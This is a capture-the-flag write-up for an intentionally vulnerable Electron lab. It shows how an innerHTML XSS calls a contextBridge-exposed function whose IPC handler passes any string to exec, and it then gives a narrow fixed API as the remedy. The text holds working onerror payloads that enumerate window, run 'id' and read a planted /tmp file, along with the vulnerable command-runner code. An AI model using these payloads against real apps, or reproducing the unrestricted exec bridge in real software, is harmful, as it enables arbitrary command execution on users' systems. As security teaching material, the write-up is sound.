# Challenge 2 — Bridged — Writeup

Module: What Can XSS Do in Electron?
Lab page: `src/renderer/pages/xss-system-api.html`
Lab script: `src/renderer/js/xss-system-api.js`
Window creation: `src/main/main.js` (`openXSSBridgedWindow`)
Window preload: `src/main/preload-xss-bridged.js`

---

## 1. Objective

Using only the lab's injection point (the identical `innerHTML` sink as Challenge 1), against
a window whose core hardening is otherwise correct — `sandbox: true`, `contextIsolation: true`,
`nodeIntegration: false` — complete three tasks:

1. Discover what the preload exposed on `window`.
2. Call that exposed function and get a real response back from the main process.
3. Use it to run a command that retrieves proof of real operating-system access.

Challenge 1 proved that the identical bug stays contained when the config is fully correct.
This challenge proves the opposite: one over-eager `contextBridge` exposure is enough to undo
every other flag being set right.

---

## 2. Exploitation walkthrough

**Setup — the config is Challenge 1's, plus one exposure.** `openXSSBridgedWindow()` creates
this window with exactly the same three hardening flags as Challenge 1:

```js
// src/main/main.js
function openXSSBridgedWindow() {
  const win = new Window({
    file: path.join('src/renderer/pages', 'xss-system-api.html'),
    webPreferences: {
      preload: path.join(__dirname, 'preload-xss-bridged.js'),
      sandbox: true,
      contextIsolation: true,
      nodeIntegration: false,
    },
  });
  ...
}
```

Its preload, though, exposes one function via `contextBridge`:

```js
// src/main/preload-xss-bridged.js
contextBridge.exposeInMainWorld('systemAPI', {
  runCommand: (cmd) => ipcRenderer.invoke('bridge-run-command', cmd),
});
```

And the main-process side of that IPC channel genuinely runs whatever string it's given:

```js
// src/main/main.js
ipcMain.handle('bridge-run-command', (event, cmd) => {
  return new Promise((resolve) => {
    exec(cmd, { timeout: 5000 }, (err, stdout, stderr) => {
      if (err) {
        resolve('Error: ' + err.message);
      } else {
        resolve(BRIDGE_CALL_FLAG + '\n' + (stdout || stderr || '(no output)'));
      }
    });
  });
});
```

No allowlist, no argument validation, no distinction between an expected command and anything
else `child_process.exec` will happily run — the entire string reaches a real shell. This is
the same shape as **CVE-2020-25019**-class Electron bugs: a `contextBridge`-exposed function
that looks narrow (`runCommand`) but is actually a general-purpose command runner, reachable by
any script executing on the page.

Notice what *isn't* different from Challenge 1: `sandbox`, `contextIsolation`, and
`nodeIntegration` are identical. That's deliberate — this challenge isolates the one variable
that matters. It's also why `preload-xss-bridged.js` calls `ipcRenderer.invoke()` rather than
calling `child_process.exec()` directly the way an unsandboxed preload could — `sandbox: true`
restricts what a preload script itself can `require()`, so the actual command execution has to
happen in the main process, reached over IPC. The relay changes nothing about the outcome for
an attacker; it's purely why the vulnerable code lives in `main.js` instead of the preload here.

The injection point is the exact same sink as Challenge 1:

```js
// src/renderer/js/xss-system-api.js
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const val = document.getElementById('xssInput2').value;
  document.getElementById('xssOutput2').innerHTML = val;
});
```

Every payload below uses an event-handler attribute (`onerror`) for execution, same reason as
Challenge 1: `innerHTML` doesn't execute inserted `<script>` tags.

**Task 1 — discover the bridge.** Before calling anything, a real attacker first has to find
out what the preload put within reach. `contextBridge.exposeInMainWorld()` defines its exposed
object as an ordinary own, enumerable property of `window` in this isolated main world, so it
shows up in a plain enumeration — this is exactly how this class of bug gets found in the wild,
not a contrived teaching mechanic:

```html
<img src=x onerror="var found = Object.keys(window).find(function (k) { return window[k] && typeof window[k].runCommand === 'function'; }); document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>found:' + found + '</li>')">
```

This walks `window`'s own keys looking for anything shaped like a command runner (an object
with a `runCommand` function) rather than guessing the name `systemAPI` in advance — the same
recon technique works against a bridge with any name. Submitting it writes `found:systemAPI`
into the attacker view; the lab independently re-checks that `window.systemAPI.runCommand` is
genuinely a function before granting the flag, so naming a real API is what's required — not
just writing a plausible-looking string. Reveals: `DVEA{overprivileged_bridge_found}`.

**Task 2 — call it successfully.** Now invoke the discovered function and prove the round trip
actually reaches the main process and comes back:

```html
<img src=x onerror="window.systemAPI.runCommand('id').then(function (out) { document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + out.replace(/\n/g, ' ') + '</li>'); })">
```

`runCommand` resolves with whatever `bridge-run-command`'s handler returns — on any command
that doesn't error, that's `BRIDGE_CALL_FLAG` (`DVEA{bridge_command_executed}`) followed by the
command's real output, so the flag can only appear here as a consequence of a genuinely
successful call — there's nothing to fake without actually invoking the bridge. Reveals:
`DVEA{bridge_command_executed}`.

**Task 3 — reach the OS through it.** `openXSSBridgedWindow()` plants a real file at
`/tmp/dvea-bridge-secret.txt` containing `DVEA{bridge_to_os_pivot}` when the window opens.
Retrieving it has to happen through the bridge — nothing on the page can reach it any other
way:

```html
<img src=x onerror="window.systemAPI.runCommand('cat /tmp/dvea-bridge-secret.txt').then(function (out) { document.getElementById('attacker-log').insertAdjacentHTML('beforeend', '<li>' + out.replace(/\n/g, ' ') + '</li>'); })">
```

The command's real output — the actual content of a real file on the real filesystem — is what
carries the flag, mirroring how Challenge 1's Task 2 made the recovered `localStorage` value
itself the proof. Reveals: `DVEA{bridge_to_os_pivot}`.

**Beyond the flag.** `runCommand` isn't limited to `cat`. The same call reaches anything the
app process can: `id`, `whoami`, reading arbitrary files the app's OS user can access, writing
files, or launching other processes — this lab's secret file is simply a convenient, provable
target, not the limit of what the bridge actually grants.

---

## 3. Vulnerable code vs. fixed code

**Vulnerable** (`src/main/preload-xss-bridged.js` + `src/main/main.js`):

```js
// preload-xss-bridged.js
contextBridge.exposeInMainWorld('systemAPI', {
  runCommand: (cmd) => ipcRenderer.invoke('bridge-run-command', cmd),
});
```

```js
// main.js
ipcMain.handle('bridge-run-command', (event, cmd) => {
  return new Promise((resolve) => {
    exec(cmd, { timeout: 5000 }, (err, stdout, stderr) => {
      resolve(err ? 'Error: ' + err.message : stdout || stderr || '(no output)');
    });
  });
});
```

**Fixed** — do not expose a general command runner at all. Replace it with narrow, specific,
validated operations that each do exactly one thing the app actually needs:

```diff
 // preload-xss-bridged.js
-contextBridge.exposeInMainWorld('systemAPI', {
-  runCommand: (cmd) => ipcRenderer.invoke('bridge-run-command', cmd),
-});
+contextBridge.exposeInMainWorld('systemAPI', {
+  // One narrow operation, not a general shell. No arguments the caller controls reach a
+  // shell string at all.
+  getSystemInfo: () => ipcRenderer.invoke('get-system-info'),
+});
```

```diff
 // main.js
-ipcMain.handle('bridge-run-command', (event, cmd) => {
-  return new Promise((resolve) => {
-    exec(cmd, { timeout: 5000 }, (err, stdout, stderr) => {
-      resolve(err ? 'Error: ' + err.message : stdout || stderr || '(no output)');
-    });
-  });
-});
+const os = require('os');
+
+ipcMain.handle('get-system-info', () => {
+  // Returns fixed, non-sensitive fields the renderer actually needs — never a caller-supplied
+  // string, and never anything that reaches a shell or child_process at all.
+  return { platform: os.platform(), arch: os.arch(), release: os.release() };
+});
```

---

## 4. Why the fix works

- **Expose operations, not commands.** The vulnerable API takes a string and hands it to a
  shell — the caller effectively picks *which* main-process capability runs. The fix replaces
  that with a function that takes no attacker-influenced input and returns a fixed shape of
  data. There is no string anywhere in the fixed version that reaches `exec()`, `spawn()`, or
  any other command-execution API — so there is no injection surface to sanitize, because
  there is no shell in the path at all.
- **Principle of least privilege applies to the bridge itself, not just the renderer's
  Electron flags.** `sandbox: true` + `contextIsolation: true` + `nodeIntegration: false` are
  necessary but not sufficient — they only guarantee that the page *can't reach Node directly*.
  They say nothing about what the preload chooses to hand back across the bridge. A preload is
  a trust boundary in its own right: every function it exposes should be scoped to the single,
  specific capability the UI actually needs, exactly the same way a network API endpoint should
  expose narrow, specific operations rather than an arbitrary-command endpoint — "run this
  exact query" instead of "run this SQL string."
- **If a command genuinely must run, validate the argument space, not the string.** Where a
  real product feature needs to invoke an external command with some caller-influenced
  parameter (say, selecting one of a few known report types), the safe shape is an allowlisted
  enum passed to `execFile()` with fixed arguments — never string interpolation into a shell
  command, and never a caller-supplied string used as the command itself. This lab's fix avoids
  the shell entirely because nothing about its actual feature need justified having one.
- **This is a defense specifically for this bridge exposure** — it doesn't replace or lessen
  the value of `sandbox`/`contextIsolation`/`nodeIntegration` being correct (see Challenge 1);
  it closes the one gap those flags cannot close on their own.

---

## 5. Why this escaped (and Challenge 1 didn't)

The injected bug here — unsanitized input into `innerHTML` — is **identical** to Challenge 1's.
Nothing about the injection technique changed; every payload above uses the same `onerror`
event-handler trick against the same kind of sink. What changed is entirely `webPreferences`
and one preload decision:

- **Challenge 1 (Contained):** the same three hardening flags, and a preload
  (`src/main/preload-xss-contained.js`) that exposes nothing at all. Task 4 there — attempting
  `require('child_process')` — fails because `require` was never wired into that world. There
  was nothing to escape *to*.
- **Here (Bridged):** the same three flags, but `preload-xss-bridged.js` hands the page one
  function, and that function is a real command runner. The escape doesn't need `require` or
  Node integration at all — it walks straight through the door the preload built for it. Task 3
  above isn't a diminished version of Challenge 1's blocked Task 4; it's the same "can this XSS
  reach the OS?" question, succeeding for a completely different reason than Challenge 1's
  failed the same way for a completely different reason.
- **Foreshadowing Challenge 3 (Owned):** this challenge's escalation still needs XSS to find
  and call something main deliberately exposed — there's a bridge, and the injected script has
  to discover and use it correctly. Challenge 3 removes even that requirement: with
  `nodeIntegration: true`, the renderer's own JavaScript world simply *is* a Node environment,
  so injected script calls `require()` directly — no bridge to discover, no function to call,
  because nothing had to be exposed on purpose in the first place.

The lesson isn't "the bridge is scary, avoid contextBridge." It's that `contextBridge` is a
trust boundary exactly like an IPC handler or a network API — every function crossing it needs
the same scrutiny as a public API endpoint would get, regardless of how hardened the renderer
around it is.
